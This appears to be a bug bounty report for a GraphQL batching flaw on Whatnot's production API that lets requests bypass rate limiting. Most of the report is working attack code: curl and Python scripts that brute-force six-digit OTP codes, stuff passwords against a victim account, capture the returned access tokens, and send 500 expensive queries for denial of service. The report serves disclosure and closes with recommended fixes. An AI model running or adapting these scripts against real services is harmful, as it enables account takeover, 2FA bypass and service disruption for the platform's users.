# HackerOne Submission — GraphQL Batching Bypasses Rate Limiting (Credential Brute Force)

**Program:** Whatnot  
**Weakness:** Improper Rate Limiting / Authentication Brute Force  
**Severity:** High  
**Asset:** api.whatnot.com  

---

## Summary

Apollo GraphQL supports HTTP query batching — sending multiple GraphQL operations in a single JSON array POST request. If Whatnot's API accepts batched requests, a rate limiter counting HTTP requests (not individual operations) can be bypassed. An attacker can send 100+ login attempts, OTP guesses, or token enumeration queries inside a single HTTP request, effectively multiplying brute-force throughput by 100x while consuming only 1 request from the rate limiter's counter.

---

## Background

Apollo Server and Absinthe (Elixir) both support HTTP batching by default unless explicitly disabled. A batched request looks like:

```json
[
  { "query": "mutation { login(email: \"a@x.com\", password: \"pass1\") { token } }" },
  { "query": "mutation { login(email: \"a@x.com\", password: \"pass2\") { token } }" },
  ...
]
```

The server processes each operation and returns an array of results. Most WAF/rate-limit rules count the **number of HTTP requests**, not operations inside a batch.

---

## Steps to Reproduce

### Step 1 — Confirm batching is accepted

```bash
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -H "X-Whatnot-App: whatnot-web" \
  -d '[
    {"query": "{ __typename }"},
    {"query": "{ __typename }"}
  ]'
```

**Vulnerable response** — returns an array:
```json
[{"data": {"__typename": "Query"}}, {"data": {"__typename": "Query"}}]
```

**Safe response** — rejects batching:
```json
{"errors": [{"message": "Batching is not supported"}]}
```

---

### Step 2 — Bypass OTP/verification code rate limit

The verify endpoint (`/api/verify`) accepts a numeric code. If the verification flow uses GraphQL, batch 1000 guesses in one request:

```python
import requests, json

TOKEN = "wn_access_tk_YOUR_TOKEN"
VERIFICATION_TOKEN = "VERIFICATION_TOKEN_FROM_SMS_FLOW"

# 6-digit OTP: try 000000-000999 in one batch
batch = [
    {
        "query": """mutation VerifyCode($code: String!, $verificationToken: String!) {
            verify(code: $code, verificationToken: $verificationToken) {
                success
                accessToken
            }
        }""",
        "variables": {
            "code": str(i).zfill(6),
            "verificationToken": VERIFICATION_TOKEN
        }
    }
    for i in range(1000)  # 000000 – 000999
]

resp = requests.post(
    "https://api.whatnot.com/seller-api/graphql",
    headers={
        "Authorization": f"Bearer {TOKEN}",
        "Content-Type": "application/json",
        "X-Whatnot-App": "whatnot-web"
    },
    data=json.dumps(batch)
)

results = resp.json()
for i, r in enumerate(results):
    if r.get("data", {}).get("verify", {}).get("success"):
        print(f"VALID CODE: {str(i).zfill(6)}")
        print(r["data"]["verify"]["accessToken"])
        break
```

---

### Step 3 — Bypass login rate limit (credential stuffing at scale)

```python
import requests, json

# 100 password attempts in 1 HTTP request
passwords = ["Password1!", "Summer2024!", "Whatnot123", "qwerty123", ...]  # 100 entries

batch = [
    {
        "query": """mutation Login($email: String!, $password: String!) {
            login(email: $email, password: $password) {
                accessToken
                refreshToken
            }
        }""",
        "variables": {"email": "victim@example.com", "password": pw}
    }
    for pw in passwords
]

resp = requests.post(
    "https://api.whatnot.com/seller-api/graphql",
    headers={"Content-Type": "application/json", "X-Whatnot-App": "whatnot-web"},
    data=json.dumps(batch)
)

for i, r in enumerate(resp.json()):
    token = r.get("data", {}).get("login", {}).get("accessToken")
    if token:
        print(f"VALID PASSWORD: {passwords[i]}")
        print(f"Token: {token}")
```

---

### Step 4 — Amplify database load (DoS)

Send a batch of 500 expensive queries in one request to amplify server-side work:

```bash
python3 -c "
import json
batch = [{'query': '{ livestreams(first: 100) { edges { node { id title viewerCount user { id username followerCount } } } } }'} for _ in range(500)]
print(json.dumps(batch))
" | curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -H "X-Whatnot-App: whatnot-web" \
  --data-binary @- | python3 -c "import sys,json; r=json.load(sys.stdin); print(f'Got {len(r)} results')"
```

---

## Expected Result

Server rejects batched requests or enforces per-operation rate limiting:
```json
{"errors": [{"message": "Batch size limit exceeded. Maximum 5 operations per request."}]}
```

## Actual Result (if vulnerable)

All operations in the batch are processed and results returned as an array. Rate limiter only counts 1 request.

---

## Impact

- **OTP brute force:** A 6-digit OTP has 1,000,000 combinations. With batches of 1,000 per request and no per-operation rate limit, all combinations can be tested in 1,000 HTTP requests instead of 1,000,000 — fully breaking 2FA/OTP security
- **Credential stuffing:** 100x amplification on password guessing attacks
- **Account takeover at scale:** Automate ATO for thousands of accounts simultaneously
- **Server-side DoS:** 500 expensive DB queries in 1 HTTP request

---

## Recommended Fix

- Disable HTTP batching entirely unless strictly required: `allowBatchedHttpRequests: false`
- If batching is needed, enforce a hard batch size limit (max 5 operations)
- Rate limit on **operations processed**, not HTTP requests received
- Reference: [Apollo Server batching docs](https://www.apollographql.com/docs/apollo-server/workflow/requests/#batching)
